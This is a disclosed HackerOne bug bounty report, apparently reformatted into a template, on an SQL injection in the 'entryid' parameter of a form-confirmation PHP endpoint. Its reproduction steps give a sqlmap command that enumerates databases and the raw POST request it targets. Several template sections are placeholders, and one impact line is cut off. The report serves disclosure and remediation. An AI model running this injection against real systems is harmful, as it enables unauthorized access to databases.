# SQL Injection - entryid parameter in 'formbuilderv2-confirmation.php'

## Metadata
- **Source:** HackerOne
- **Report:** 3127198 | https://hackerone.com/reports/3127198
- **Submitted:** 2025-05-05
- **Reporter:** jonasdiasrebelo
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Description:**
Hi!
I discovered a SQL Injection vulnerability via entryid on the website █████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████████

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Poten

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**
Hi!
I discovered a SQL Injection vulnerability via entryid on the website █████. The vulnerability allows for the manipulation of SQL queries executed by the backend database, which could potentially lead to unauthorized data access or manipulation.

## References

█████████

## Impact

The ability to manipulate SQL queries can lead to:
Unauthorized access to sensitive data.
Potential data leakage.
Data manipulation or corruption.
Full database compromise if administrative permissions are accessible.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use the sqlmap:

sqlmap -r file3.txt --dbs --tamper=between -p 'entryid' --dbms=mysql --batch


Use the file3.txt:

```
POST /actions/formbuilderv2-confirmation.php HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https███
Cookie: █████████
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 112
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Host: █████████
Connection: Keep-alive

entryid=1&formid=1&redirect=/form/apply-online/thank-you&useremail=
```

## Suggested Mitigation/Remediation Actions
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.



</details>

---
*Analysed by Claude on 2026-05-24*
